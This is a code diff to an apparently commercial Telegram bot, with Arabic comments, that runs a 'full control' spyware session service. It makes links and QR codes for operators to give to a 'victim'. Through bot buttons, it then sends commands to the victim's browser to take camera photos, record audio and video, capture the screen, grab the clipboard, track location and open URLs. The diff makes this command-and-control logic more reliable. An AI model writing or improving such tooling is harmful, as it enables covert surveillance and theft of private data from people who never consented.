@@ -41,7 +41,7 @@ except Exception as e:
     generate_qr_code_bytes = lambda *args: None
 
 # ============================================================
-# استيراد LSH Module (أداة السيطرة الكاملة)
+# استيراد LSH Module
 # ============================================================
 try:
     from lsh_module import (
@@ -118,6 +118,7 @@ if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
 try:
     redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
     redis_client.ping()
+    print("[+] main: Redis connected")
 except Exception as e:
     print(f"[-] Critical Redis Connection Error: {e}")
     redis_client = None
@@ -183,7 +184,6 @@ def payment_menu():
 # رسائل مساعدة
 # ============================================================
 def _deny_message(reason, user_id, tool, data=None):
-    """رسالة الرفض بناءً على السبب"""
     data = data or {}
     if reason == "daily_limit_reached":
         return (
@@ -353,7 +353,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # توليد LSH (جديد)
+    # توليد LSH
     # ============================================================
     if call.data == "gen_lsh":
         check = can_use_tool(chat_id, "lsh")
@@ -364,48 +364,53 @@ def callback_handler(call):
         consume_usage(chat_id, "lsh")
         bot.answer_callback_query(call.id, "جاري تجهيز جلسة التحكم الكامل...")
 
-        # إنشاء جلسة عبر endpoint داخلي
-        try:
-            resp = requests.post(
-                f"{RAILWAY_URL}/lsh_create",
-                json={"chat_id": chat_id},
-                timeout=10
-            )
-            session_id = resp.json().get("session_id")
-        except Exception as e:
-            print(f"[-] LSH create error: {e}")
-            session_id = None
+        # إنشاء الجلسة محلياً مباشرة (بدون HTTP)
+        session_id = str(uuid.uuid4()).replace('-', '')[:24]
+        if redis_client:
+            try:
+                redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
+            except Exception as e:
+                print(f"[-] Redis setex LSH error: {e}")
 
-        # احتياطي: إنشاء الجلسة محلياً إذا فشل الـ HTTP
-        if not session_id:
-            session_id = str(uuid.uuid4()).replace('-', '')[:24]
-            if redis_client:
-                try:
-                    redis_client.setex(f"lsh_session:{session_id}", 86400, chat_id)
-                except Exception as e:
-                    print(f"[-] Redis setex LSH error: {e}")
+        # محاولة إنشاء جلسة في الذاكرة أيضاً عبر HTTP (اختياري)
+        try:
+            requests.post(
+                f"{RAILWAY_URL}/lsh_create",
+                json={"chat_id": chat_id, "session_id": session_id},
+                timeout=5
+            )
+        except Exception as e:
+            print(f"[-] LSH create HTTP warning: {e}")
 
         target_link = f"{RAILWAY_URL}/lsh?s={session_id}&id={chat_id}"
         qr_image = lsh_generate_qr(target_link)
 
         if qr_image:
             qr_image.name = 'lsh_qr.png'
-            bot.send_photo(
-                chat_id, qr_image,
-                caption=(
-                    "🕹️ **جلسة السيطرة الكاملة جاهزة!**\n"
-                    "━━━━━━━━━━━━━━━━━━\n\n"
-                    "🎯 **وجّه الضحية لمسح الكود أو افتح الرابط:**\n"
-                    f"`{target_link}`\n\n"
-                    "📊 **ما سيتم تلقائياً:**\n"
-                    "• تقرير كامل عن الجهاز + IP الحقيقي\n"
-                    "• صورة من الكاميرا الأمامية\n"
-                    "• تسجيل صوتي من الميكروفون\n"
-                    "• لوحة تحكم حية بأزرار تفاعلية\n\n"
-                    "⚠️ الجلسة تنتهي بعد 24 ساعة."
-                ),
-                parse_mode="Markdown"
-            )
+            try:
+                bot.send_photo(
+                    chat_id, qr_image,
+                    caption=(
+                        "🕹️ **جلسة السيطرة الكاملة جاهزة!**\n"
+                        "━━━━━━━━━━━━━━━━━━\n\n"
+                        "🎯 **وجّه الضحية لمسح الكود أو افتح الرابط:**\n"
+                        f"`{target_link}`\n\n"
+                        "📊 **ما سيتم تلقائياً:**\n"
+                        "• تقرير كامل عن الجهاز + IP الحقيقي\n"
+                        "• صورة من الكاميرا الأمامية\n"
+                        "• تسجيل صوتي من الميكروفون\n"
+                        "• لوحة تحكم حية بأزرار تفاعلية\n\n"
+                        "⚠️ الجلسة تنتهي بعد 24 ساعة."
+                    ),
+                    parse_mode="Markdown"
+                )
+            except Exception as e:
+                print(f"[-] send_photo error: {e}")
+                bot.send_message(
+                    chat_id,
+                    f"🕹️ **رابط الجلسة:**\n`{target_link}`",
+                    parse_mode="Markdown"
+                )
         else:
             bot.send_message(
                 chat_id,
@@ -430,47 +435,59 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # أوامر LSH (لا تستهلك رصيداً)
+    # أوامر LSH — الأسماء الجديدة المطابقة لـ lsh_module.py
     # ============================================================
     if call.data.startswith("lsh_snap_"):
         sid = call.data.replace("lsh_snap_", "")
-        lsh_push_command(sid, {"action": "snapshot"})
-        bot.answer_callback_query(call.id, "⏳ جاري طلب صورة من الضحية...")
+        ok = lsh_push_command(sid, {"action": "snapshot"})
+        bot.answer_callback_query(call.id, "📸 جاري طلب الصورة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
+        if not ok:
+            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
     if call.data.startswith("lsh_audio_"):
         sid = call.data.replace("lsh_audio_", "")
-        lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
-        bot.answer_callback_query(call.id, "⏳ جاري التسجيل من الميكروفون...")
+        ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
+        bot.answer_callback_query(call.id, "🎙️ جاري التسجيل..." if ok else "❌ فشل الإرسال", show_alert=not ok)
+        if not ok:
+            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
     if call.data.startswith("lsh_video_"):
         sid = call.data.replace("lsh_video_", "")
-        lsh_push_command(sid, {"action": "video_recording", "payload": {"duration": 10000}})
-        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الفيديو...")
+        ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
+        bot.answer_callback_query(call.id, "🎥 جاري تسجيل الفيديو..." if ok else "❌ فشل الإرسال", show_alert=not ok)
+        if not ok:
+            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
     if call.data.startswith("lsh_screen_"):
         sid = call.data.replace("lsh_screen_", "")
-        lsh_push_command(sid, {"action": "screen_share"})
-        bot.answer_callback_query(call.id, "⏳ جاري التقاط الشاشة...")
+        ok = lsh_push_command(sid, {"action": "screen"})
+        bot.answer_callback_query(call.id, "🖥️ جاري التقاط الشاشة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
+        if not ok:
+            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
     if call.data.startswith("lsh_clip_"):
         sid = call.data.replace("lsh_clip_", "")
-        lsh_push_command(sid, {"action": "get_clipboard"})
-        bot.answer_callback_query(call.id, "⏳ جاري سحب الحافظة...")
+        ok = lsh_push_command(sid, {"action": "clipboard"})
+        bot.answer_callback_query(call.id, "📋 جاري سحب الحافظة..." if ok else "❌ فشل الإرسال", show_alert=not ok)
+        if not ok:
+            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
     if call.data.startswith("lsh_loc_"):
         sid = call.data.replace("lsh_loc_", "")
-        lsh_push_command(sid, {"action": "request_location"})
-        bot.answer_callback_query(call.id, "⏳ جاري تحديث الموقع...")
+        ok = lsh_push_command(sid, {"action": "location"})
+        bot.answer_callback_query(call.id, "📍 جاري تحديث الموقع..." if ok else "❌ فشل الإرسال", show_alert=not ok)
+        if not ok:
+            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
     if call.data.startswith("lsh_open_"):
         sid = call.data.replace("lsh_open_", "")
-        bot.answer_callback_query(call.id, "أرسل الرابط الآن")
+        bot.answer_callback_query(call.id, "🌐 أرسل الرابط الآن")
         _pending_open_url[chat_id] = sid
         bot.send_message(
             chat_id,
@@ -481,14 +498,18 @@ def callback_handler(call):
 
     if call.data.startswith("lsh_vibrate_"):
         sid = call.data.replace("lsh_vibrate_", "")
-        lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500, 200, 500]}})
-        bot.answer_callback_query(call.id, "✅ تم تفعيل الاهتزاز")
+        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500, 200, 500]}})
+        bot.answer_callback_query(call.id, "📳 تم الإرسال" if ok else "❌ فشل الإرسال", show_alert=not ok)
+        if not ok:
+            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
     if call.data.startswith("lsh_kill_"):
         sid = call.data.replace("lsh_kill_", "")
-        lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
-        bot.answer_callback_query(call.id, "✅ تم إنهاء الجلسة")
+        ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
+        bot.answer_callback_query(call.id, "❌ جاري الإنهاء..." if ok else "❌ فشل الإرسال", show_alert=not ok)
+        if not ok:
+            bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
 
 
@@ -502,8 +523,11 @@ _pending_open_url = {}
 def handle_open_url(message):
     sid = _pending_open_url.pop(message.chat.id, None)
     if sid:
-        lsh_push_command(sid, {"action": "open_url", "payload": {"url": message.text}})
-        bot.send_message(message.chat.id, "✅ سيتم فتح الرابط على جهاز الضحية خلال ثوانٍ")
+        ok = lsh_push_command(sid, {"action": "url", "payload": {"url": message.text}})
+        if ok:
+            bot.send_message(message.chat.id, "✅ سيتم فتح الرابط على جهاز الضحية خلال ثانيتين")
+        else:
+            bot.send_message(message.chat.id, "❌ **فشل الإرسال** — تحقق من اتصال Redis")
 
 
 # ============================================================
@@ -511,7 +535,6 @@ def handle_open_url(message):
 # ============================================================
 def run_telegram_bot():
     print("[+] Starting Telegram Bot polling in background thread...")
-    # حذف أي Webhook قديم حتى يعمل polling بشكل صحيح
     try:
         bot.delete_webhook(drop_pending_updates=True)
         print("[+] Old webhook deleted, polling mode active")
